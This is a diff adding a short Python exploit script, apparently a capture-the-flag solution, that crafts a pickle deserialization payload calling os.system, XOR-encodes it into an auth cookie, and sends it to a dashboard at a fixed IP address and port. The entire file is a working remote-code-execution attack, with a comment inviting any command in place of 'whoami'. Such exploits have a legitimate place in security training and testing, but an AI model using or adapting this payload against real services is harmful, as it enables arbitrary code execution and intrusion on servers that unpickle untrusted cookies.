@@ -1,0 +1,33 @@
+import requests
+import pickle
+import os
+from pwn import xor
+
+class RCE:
+    def __reduce__(self):
+        cmd = "whoami"  # Replace with the command you want to run
+        return os.system, (cmd,)
+
+url = "http://35.246.134.224:31450/dashboard"
+
+# Create the payload
+payload = pickle.dumps(RCE(), protocol=2)
+
+# Generate the key
+key = len(payload) * "A"
+
+# Create the auth cookie by XORing the payload with the key
+auth_cookie = xor(payload, key.encode()).hex()
+
+# Set the cookies
+cookies = {
+    "key": key,
+    "auth_cookie": auth_cookie
+}
+
+# Send the request
+response = requests.get(url, cookies=cookies)
+
+print(response.text)
+
+
